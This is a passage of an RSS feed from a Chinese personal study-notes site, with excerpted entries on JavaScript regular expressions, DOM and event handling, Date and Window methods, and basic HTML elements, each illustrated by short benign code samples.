      <description>元字符 \n 将 n 标记为一个特殊字符（将特殊字符进行转义）、或一个原义字符、或一个向后引用、或一个八进制转义符。
\w 匹配字母、数字、下划线。等价于[A-Za-z0-9_]。
var reg = /\wcd2/g;  var str = &amp;#39;bcd2&amp;#39;;  var result = str.match(reg); console.log(result); \W 匹配非字母、数字、下划线。等价于 [^A-Za-z0-9_]。
var reg = /\Wcd2/g;  var str = &amp;#39;b*cd2&amp;#39;;  var result = str.match(reg); console.log(result); \d 匹配一个数字字符。等价于 [0-9]。
\D 匹配一个非数字字符。等价于 [^0-9]。
\s 匹配任何空白字符，包括空格符、制表符\t、回车符\r、换行符\n、垂直制表符\v、换页符\f。
等价于 [ \f\n\r\t\v]。
\S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
\b 匹配一个单词边界，也就是指单词和空格间的位置。
例如， er\b可以匹配 never 中的 &amp;rsquo;er&amp;rsquo;，但不能匹配 verb 中的 er。
var reg = /\bname/g;  var str = &amp;#39;my name is rainy&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>RegExp 实例</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%AE%9E%E4%BE%8B/</guid>
      <description>实例 匹配字符串首或尾是数字的字符串 var reg = /^\d|\d$/g;  var str = &amp;#39;2dfds&amp;#39;;  var result = str.match(reg); console.log(result); 匹配字符串首尾都是数字的字符串 var reg = /^\d[\s\S]*\d$/g;  var str = &amp;#39;2dfds2&amp;#39;;  var result = str.match(reg); console.log(result); 将以 - 分割的字符串变为小驼峰式的字符串 var str = &amp;#39;the-first-name&amp;#39;; var reg = /-(\w)/g; var result = str.replace(reg, function ($, $1) { 	return $1.toUpperCase(); }); console.log(result); 字符串去重 var str = &amp;#39;aaaabbbbccccddddd&amp;#39;; var reg = /(\w)\1+/g; var result = str.replace(reg, &amp;#39;$1&amp;#39;); console.</description>
    </item>
    
    <item>
      <title>RegExp 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E6%96%B9%E6%B3%95/</guid>
      <description>RegExp 方法 exec() 如果匹配模式带有g修饰符，则每匹配一次，匹配结束的位置就是下一次匹配的起始位置。
如果匹配模式不带g修饰符，则不管匹配多少次，匹配的起始位置始终都只从lastIndex = 0开始。即不管匹配多少次，lastIndex 都只为 0。
加 g 修饰符 // 加 g 修饰符 var reg = /ab/g;  var str = &amp;#39;abababab&amp;#39;;  // 第一次匹配，lastIndex 从 0 开始匹配，匹配完后 lastIndex = 2 console.log(reg.exec(str));  // 第二次匹配，lastIndex 从 2 开始匹配，匹配完后 lastIndex = 4 console.log(reg.exec(str));  // 第三次匹配，lastIndex 从 4 开始匹配，匹配完后 lastIndex = 6 console.log(reg.exec(str));  // 第四次匹配，lastIndex 从 6 开始匹配，匹配后 lastIndex = 8 console.log(reg.exec(str));  // 第五次匹配，lastIndex 从 8 开始匹配， // 因为从 8 开始匹配，无法匹配到任何值，因此此处返回 null // 返回 null 之后，lastIndex 从起始位置 0 开始，即现在的 lastIndex = 0， console.</description>
    </item>
    
    <item>
      <title>RegExp 普通字符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</guid>
      <description>普通字符 () 匹配与()中的字表达式相同的字符。可以用()来标记一个子表达式的开始和结束位置，后面我们可以用\1（反向引用）来引用第一个()中的字表达式。
// 表示匹配与 \w 相同的四个连续的字符 var reg = /(\w)\1\1\1/g;  var str = &amp;#39;aaaabbbbccccc&amp;#39;;  var result = str.match(reg);  console.log(result); 也可以使用\2来引用第二个子表达式：
var reg = /(\w)\1(\w)\2/g;  var str = &amp;#39;ccddvvffff&amp;#39;;  var result = str.match(reg);  console.log(result); 普通字符 () 标记一个子表达式的开始和结束位置，即匹配与()中的字表达式相同的字符，之后我们可以用\1（反向引用）来引用第一个()中的字表达式。
// 表示匹配与 \w 相同的四个连续的字符 var reg = /(\w)\1\1\1/g;  var str = &amp;#39;aaaabbbbccccc&amp;#39;;  var result = str.match(reg);  console.log(result); 也可以使用\2来引用第二个子表达式：
var reg = /(\w)\1(\w)\2/g;  var str = &amp;#39;ccddvvffff&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>JavaScript Document</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document/</guid>
      <description>Document Document 是文档的根，表示整个文档，它包含所有元素，包括 html 元素。</description>
    </item>
    
    <item>
      <title>JavaScript Document 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</guid>
      <description>Document 属性 head 和 body 表示文档中的 head 和 body 元素。
document.head; document.body; documentElement 表示文档中的 html 元素。
document.documentElement; </description>
    </item>
    
    <item>
      <title>JavaScript Document 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 07 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</guid>
      <description>Document 方法 查找节点 使用 querySelectorAll 和 querySelector 方法选择的元素不是实时的，而使用 getElements 方法选择的元素是实时的。
比如，使用 querySelecto 选择 div 元素，并存放到 ele 变量中，如果后面我们在文档中删除或增加一个 div 元素，ele 中的 div 元素依旧不变。
getElementById() 选择文档中指定 id 的元素，id 是唯一的，所以是 getElement，不是 getElements
var ele = document.getElementById(&amp;#39;only&amp;#39;); getElementsByTagName() 选择文档中指定标签名的元素，返回结果是一个类数组
var ele = document.getElementsByTagName(&amp;#39;span&amp;#39;); getElementsByTagName(&amp;rsquo;*&#39;) 选择文档中的所有元素。
var ele = document.getElementsByTagName(&amp;#39;*&amp;#39;); getElementsByName() 选择文档中指定 name 的元素，ele 是一个类数组，需要注意，该元素只有部分元素才能生效
var ele = document.getElementsByName(&amp;#39;span&amp;#39;); getElementsByClassName() 选择文档中指定 class 的元素
var ele = document.getElementsByClassName(&amp;#39;build&amp;#39;); querySelector() 选择匹配指定选择器的第一个元素。不实时
var ele = document.querySelector(&amp;#39;div &amp;gt; span a .</description>
    </item>
    
    <item>
      <title>HTML 伪元素和伪类</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</link>
      <pubDate>Fri, 06 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</guid>
      <description>伪元素和伪类 伪类选择器和伪元素选择器都是 CSS 选择器的一种。
伪类选择器使用:开头。
伪元素选择器使用::开头
伪类 用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态根据用户行为而动态变化。
比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的 css 类相似，可以为已有的元素添加样式，但是它只有处于 DOM 树无法描述的状态下才能为元素添加样式，所以将其称为伪类。
伪元素 伪元素用于创建一些不在 DOM 树中的元素（虚拟元素），并为其添加其 CSS 样式。伪元素开头为双冒号::。
比如说，我们可以用::before或::after在一个元素的前面或后面增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在 DOM 树中，因为他们都是虚拟的元素。
 </description>
    </item>
    
    <item>
      <title>HTML DOCTYPE</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/doctype/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/doctype/</guid>
      <description>DOCTYPE 用来告知浏览器该使用了哪种渲染方式来渲染当前文档。
文档首行是&amp;lt;!DOCTYPE html&amp;gt;，则浏览器渲染模式为标准模式；首行不是或没有&amp;lt;!DOCTYPE html&amp;gt;则浏览器的渲染模式为怪异模式。
目前浏览器的渲染引擎使用三种模式：怪异模式、接近标准模式、以及标准模式。
历史问题 在很久以前的网络上，页面通常有两种版本：为网景的 Navigator 准备的版本，以及为微软的 Internet Explorer 准备的版本。
当 W3C 创立网络标准后，为了不破坏当时既有的网站，浏览器不能直接弃用这些标准。因此，浏览器采用了两种模式，用以把能符合新规范的网站和老旧网站区分开。
标准模式 在标准模式下，行为即由 HTML 与 CSS 的规范描述的行为。
在接近标准模式下，只有少数的怪异行为被实现。
怪异模式 在怪异模式下，文档会兼容之前的网页。也叫混杂模式。
compatMode 返回当前浏览器采用的渲染方式。
BackCompat 标准兼容模式关闭，当 document.compatMode 等于 BackCompat 时，浏览器客户区宽度为 document.body.clientWidth;
CSS1Compat 标准兼容模式开启,当 document.compatMode 等于 CSS1Compat 时浏览器客户区宽度为 document.documentElement.clientWidth;</description>
    </item>
    
    <item>
      <title>HTML 表单元素</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</guid>
      <description>表单元素 label 关联指定的表单元素。
for 为需要关联的元素 id，关联之后，当点击label 时，也可以聚焦到label所关联的元素。
&amp;lt;label for=&amp;#34;account&amp;#34;&amp;gt;账号：&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;account&amp;#34; /&amp;gt; select 下拉列表。
option 定义下拉列表中可选择的选项。
通过添加 selected 属性来定义默认选项。
&amp;lt;select name=&amp;#34;cars&amp;#34;&amp;gt; 	&amp;lt;option value=&amp;#34;volvo&amp;#34; selected&amp;gt;Volvo&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;saab&amp;#34;&amp;gt;Saab&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;fiat&amp;#34;&amp;gt;Fiat&amp;lt;/option&amp;gt; 	&amp;lt;option value=&amp;#34;audi&amp;#34;&amp;gt;Audi&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; textarea 文本域（多行输入框）。
&amp;lt;textarea name=&amp;#34;message&amp;#34; rows=&amp;#34;10&amp;#34; cols=&amp;#34;30&amp;#34;&amp;gt; The cat was playing in the garden. &amp;lt;/textarea&amp;gt; button 按钮。
&amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;alert(&amp;#39;Hello World!&amp;#39;)&amp;#34;&amp;gt;Click Me!&amp;lt;/button&amp;gt; datalist datalist为 input 设置预定义的下拉列表。
input 获取焦点时，可以看到预定义的下拉列表。
input 的 list 属性必须为 datalist的 id。</description>
    </item>
    
    <item>
      <title>JavaScript Date</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</guid>
      <description>Date 创建一个 Date 实例，该实例呈现时间中的某个时刻。
Date 对象基于格林威治 Unix Time Stamp，即自 1970 年 1 月 1 日（UTC）起经过的毫秒数。
Date 对象有大量的设置、获取和操作日期的方法。 但它并不含有任何属性。
Date 对象中存放的都是被构造出来的那一刻的时间，而不是随着系统时间改变而改变。</description>
    </item>
    
    <item>
      <title>JavaScript Element</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/element/</guid>
      <description>Element 用来遍历元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</guid>
      <description>Event stopPropagation() 用于取消事件的捕获和冒泡，W3C 推荐的方法。
cancelBubble() 功能与stopPropagation()相同， IE 独有，但在 Chrome 中也可以用。
var wrapper = document.getElementsByClassName(&amp;#39;wrapper&amp;#39;)[0];  document.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;document&amp;#39;); 	}, 	false );  wrapper.addEventListener( 	&amp;#39;click&amp;#39;, 	function (event) { 	console.log(&amp;#39;点击了子元素&amp;#39;);  	event.stopPropagation(); 	// IE 独有，但 Chrome 也可以使用 	event.cancelBubble = true; 	}, 	false ); </description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event/</guid>
      <description>Event 表示在 DOM 中出现的事件。</description>
    </item>
    
    <item>
      <title>JavaScript Event 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</guid>
      <description>Event 属性 target 返回触发当前事件的事件源对象。
document.onclick = function (event) { 	console.log(event.target); }; </description>
    </item>
    
    <item>
      <title>JavaScript EventTarget</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/eventtarget/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/eventtarget/</guid>
      <description>EventTarget addEventListener() 监听一个对象，并给这个对象绑定指定的事件处理函数。
第一个参数是事件类型，第二个参数是事件的回调回函数。
this 的指向是 DOM 元素本身，第三个参数是一个布尔值，用于定义该对象应该使用哪一种事件处理模型（冒泡、捕获）进行触发。
优点 可以给同一个对象同一类型事件绑定多个事件处理函数，并且会按绑定事件的先后顺序去执行。
// 旧事件 div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第一个事件&amp;#39;); 	}, 	false ); // 新事件，不会fu div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第二个事件&amp;#39;); 	}, 	false ); attachEvent() IE 独有事件，它与 addEventListener() 差不多。
this 指向 window。
for 绑定 addEventListener() 事件 var li = document.getElementsByTagName(&amp;#39;li&amp;#39;);  var len = li.length; for (var i = 0; i &amp;lt; len; i++) { 	// 用立即执行函数解决闭包内存泄漏的问题 	(function (i) { 	li[i].</description>
    </item>
    
    <item>
      <title>JavaScript get 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</guid>
      <description>get 方法 getDate() 返回一个月中的某天 1 — 31
getDay() 返回一周中的某天 0 — 6。
注意，0 表示周一，6 表示周日。
getMonth() 返回一年终的某月 0 — 11。
注意，0 表示一月，11 表示 12 月
getFullYear() 获取四位数的年份 XXXX。
以前是用的 getYear() 方法，因为以前表示日期用的六位制 YY.MM.DD，直到 1999 年 12 月 31 日之后，变成了 2000 年，这个时候的日期用六位制已经无法表示了，因此，现在改用八位制 YYYY.MM.DD。
getHours() 获取小时 0 — 23
getMinutes() 获取分 0 — 59
getSeconds() 获取秒 0 — 59
getMilliseconds() 获取毫秒 0 — 999
getTime() 获取毫秒（从格林威治时间 1970 年 1 月 1 日至今的毫秒数），也叫获取时间戳。
时间戳 用于验证执行某个程序所花费的毫秒数。</description>
    </item>
    
    <item>
      <title>JavaScript GlobalEventHandlers</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/globaleventhandlers/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/globaleventhandlers/</guid>
      <description>GlobalEventHandlers 全局事件句柄，在 JavaScrip 中，为了将属性和事件区分开，所有事件的命名都是小写的，而不是像属性那样用小驼峰式命名。
onclick 当指定元素被点击时，所触发的事件。它的兼容性非常好。
基本等于将事件写到 HTML 元素的onclick内联属性上。
this 的指向是 DOM 元素本身。
只能监听鼠标左键，无法监听右键和滚轮。
onmousedown + onmouseup = onclick
缺点 一个元素只能绑定一个事件，如果给这个元素定义新的事件，那么新的事件会覆盖旧的事件。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  // 旧事件 div.onclick = function () { 	console.log(&amp;#39;旧事件&amp;#39;); }; // 新事件，会覆盖旧事件 div.onclick = function () { 	console.log(&amp;#39;新s&amp;#39;); }; 点击事件只触发一次 div.onclick = function () { 	console.log(4555); 	// 使 onclick 事件只能被触发一次 	div.onclick = null; }; oncontextmenu 鼠标右键单击指定对象时，所触发的事件。
onmousemove 鼠标移动到指定对象上时，所触发的事件。
onmousedown 鼠标按下指定对象时，所触发的事件。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</guid>
      <description>HTMLElement 属性 innerText/textContent 设置或获取指定元素所包含的文本信息，只返文本信息，不返回所包含的元素。
另外，设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
innerText 很容易 与 textContent 混淆, 但这两个属性间实际上有很重要的区别. 大体来说, innerText 可操作已被渲染的内容， 而 textContent 则不会。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerText = &amp;#39;123&amp;#39;; /textContent div.textContent = &amp;#39;456&amp;#39;; offsetHeight 它返回该元素的像素高度，高度包含该元素的垂直内边距和边框，且是一个整数。
offsetWidth 它返回该元素的像素宽度，宽度包含该元素的水平内边距和边框，且是一个整数。
offsetLeft 返回当前元素左边界相对于最近的定位父元素的左边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetTop 它返回当前元素顶边界相对于最近的定位父元素的顶边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetParent 返回距离当前元素最近的定位父元素。
如果当前元素的父元素中没有定位元素，则返回 body。
style 设置或返回 ele 的内联样式表中的 attr，并不会返回内嵌样式表和外链样式表中的 CSS 属性。
设置的值必须为字符串格式。
如果是设置 float 这样的保留字属性，则尽量使用 cssFloat ，虽然也可以使用 float 设置，但是 W3C 并不建议使用 float，因为 float 是一个保留字，未来可能会成为关键字，避免未来的命名冲突。</description>
    </item>
    
    <item>
      <title>JavaScript set 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</guid>
      <description>set 方法 setDate() 以数值 1-31 设置日
var date = new Date(); // 设置日期中的第 18 天 var d = date.setDate(18); console.log(d); // 输出被更改后的时间戳，因为日变了，所以日对应的周也会跟着变。 console.log(date); 定时执行某个代码
用 set 方法设置一个未来的时间点，然后判断当 getTime() 的毫秒数与 set 的毫秒数相差小于 1000 的时候，相当于此刻的时间点已经和设置的时间点重合，可以执行一些需要在这个时间点所执行的操作。
用它可以实现倒计时抢漏、闹钟等功能。
setTime() 设置从 1970 年 1 月 1 日至今的毫秒数。
var date = new Date(); // 将 date 设置为从格林威治时间至今的毫秒数（毫秒数会转换为日期） date.setTime(12343546557501); // 返回设置的日期 console.log(date); 闹钟 var date = new Date(); // 设置未来的某个时间点的分和秒，当格林威治时间到达我们设置的时间戳，会执行某个操作 date.setMinutes(10); date.setSeconds(5);  // 定时器，每隔 1000 毫秒会执行一次回调函数 setInterval(function () { 	// 判断格林威治时间是否和设置的时间点相差小于 1000 毫秒（小于 1000 毫秒则表示格林威治时间已经到大我们设置的时间戳） 	if (new Date().</description>
    </item>
    
    <item>
      <title>JavaScript String 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</guid>
      <description>String 方法 fromCharCode() 将 UTF-16 组成的值转换为一个字符串。
match() 检索并返回字符串匹配正则表达式的结果。
参数通常是一个正则表达式，
var reg = /ab/g;  var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); slice() 从字符串的第 n 位字符开始截取，一直截取到字符串最末。并返回一个新的字符串，且不会改动原字符串。
search() 返回子字符串在字符串中的起始位置（索引值）这个字符串也可以使正则表达式。
匹配失败返回 -1。
var str = &amp;#39;eedsddvv&amp;#39;;  var reg = /(\w)\1(\w)\2/g;  var result = str.search(reg);  console.log(result); split() 使用指定的分隔符字符串将一个字符串对象分割成子字符串数组，以一个指定的分割字串来决定每个拆分的位置。
除了会返回匹配结果，还会返回()中第一次匹配的子表达式的值，并且这些值是类数组的数据位，它们存在于类数组的索引位中。
var str = &amp;#39;dfjajfdsssajfiovvdsafjttidjf&amp;#39;;  var reg = /(\w)\1/g;  var result = str.split(reg);  console.log(result); 用数之来分割字符串 var str = &amp;#39;dfjajfdss0sajfiovvds0afjttidjf&amp;#39;;  var reg = /\d/g;  var result = str.</description>
    </item>
    
    <item>
      <title>JavaScript Window 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</guid>
      <description>Window 属性 innerWidth 和 innerHeight 返回视口的宽度和高度。
视口就是浏览器中能看到网页的部分。
// 视口宽度 var WViewport = window.innerWidth; // 视口高度 var HViewport = window.innerHeight; console.log(&amp;#39;视口宽度：&amp;#39; + WViewport); console.log(&amp;#39;视口高度：&amp;#39; + HViewport); pageYOffset 和 pageXOffset 返回滚动条当前的纵向滚动距离和横向滚动距离。
// 纵向滚动条的滚动距离 var Ydistance = window.pageYOffset; // 横向滚动条的滚动距离 var Xdistance = window.pageXOffset; console.log(Ydistance); console.log(Xdistance); IE 8 及 IE 8 以下的浏览器 document.body.scrollLeft/Top 和 document.documentElement.scorllLeft/Top这个两个属性的兼容性机器混乱，Top 代表纵向，Left 代表横向
在 IE 8 及 IE 8 以下的浏览器中，这两个属性中只要其中一个有值，则另一个属性的值一定为 0。因此， 如果我们要考虑兼容性的问题，都会将这两个属性相加，以兼容 IE 8 及其 IE 8 以下的浏览器。
DOMContentLoaded 文档解析完成后执行的事件。</description>
    </item>
    
    <item>
      <title>JavaScript Window 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</guid>
      <description>Window 方法 scroll() 和 scrollTo() 使文档的滚动条滚动至文档中的特定位置。
//让水平的滚动条滚动到 100 像素的位置，再让垂直滚动条滚动到 200 像素的位置 scrollTo(100, 200); scrollBy() 使文档的滚动条按指定的偏移量滚动。
//　让垂直滚动条滚动 10px， scrollTo(0, 10); // 重复执行的话，滚动条会再滚动 10px scrollTo(0, 10); getComputedStyle() 返回指定元素经过计算后的 CSS 样式,，且返回的值都是绝对值，它是一个只读属性。
返回的样式是元素在浏览器中最终渲染效果的样式。
第一个参数是元素，第二个参数是伪元素。
getComputedStyle() 的第二个参数可以获取第一个参数（元素）的伪元素（::before、::after等）的 CSS 样式。
第二个参数不是必须的，当不查询元素的伪元素的时候可以忽略或者传入 null。
currentStyle 只读属性，返回的 CSS 属性的值没有经过计算。IE 独有属性。
获取指定元素的指定 CSS 属性 var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  function GetStyle(elem, name) { 	if (window.getComputedStyle) { 	return window.getComputedStyle(elem, null)[name]; 	} else { 	return elem.currentStyle[name]; 	} } setInterval() 用于每隔一段时间调用一个函数或一个代码片段。</description>
    </item>
    
    <item>
      <title>JavaScript 事件句柄</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</guid>
      <description>事件句柄 事件发生时进行的操作。
事件句柄就是一个将元素的特定事件与某个函数关联起来，比如 onclick、onmouseover 等都是事件句柄，它们会指向一个给定的函数，如果事件发生，那么就会执行此函数。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件句柄&amp;#39;); }; document.onclick = function () { 	console.log(&amp;#39;点击事件句柄&amp;#39;); }; </description>
    </item>
    
    <item>
      <title>JavaScript 事件处理模型</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</guid>
      <description>事件处理模型 一个对象的一个事件类型，只能触发一种事件处理模型，也就是要么触发事件冒泡，要么触发事件捕获。
另外，并不是所有事件都存冒泡，比如 focus、blur、change、submit、reset、select 等事件。
事件冒泡 结构上（非视觉上）为嵌套关系的元素，会存在事件冒泡的情况。即同一类型的事件，触发事件源，事件会以由内（事件源）至外的顺序被触发。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  * {  margin: 0;  padding: 0;  }   .wrapper {  width: 300px;  height: 300px;  background-color: rgb(183, 43, 43);  }   .content {  width: 200px;  height: 200px;  background-color: rgb(12, 175, 200);  }   .</description>
    </item>
    
    <item>
      <title>JavaScript 事件对象</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</link>
      <pubDate>Thu, 05 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</guid>
      <description>事件对象 在 DOM 中发生事件时，所有相关信息都会被收集并存储在一个名为**event **的对象中。这个对象包含了一些基本信息，比如导致事件的元素、发生的事件类型、可能与特定事件相关的任何其他数据等。
每个事件处理函数都有一个形参 event，这个 **event **就可以在函数中被当做 event 对象来使用。
// event 是一个参数，系统会自动将事件对象传给他。 document.onclick = function (event) { 	console.log(event); }; srcElement 表示触发当前事件的事件源对象。
可以用event.target来获取事件的 srcElement。
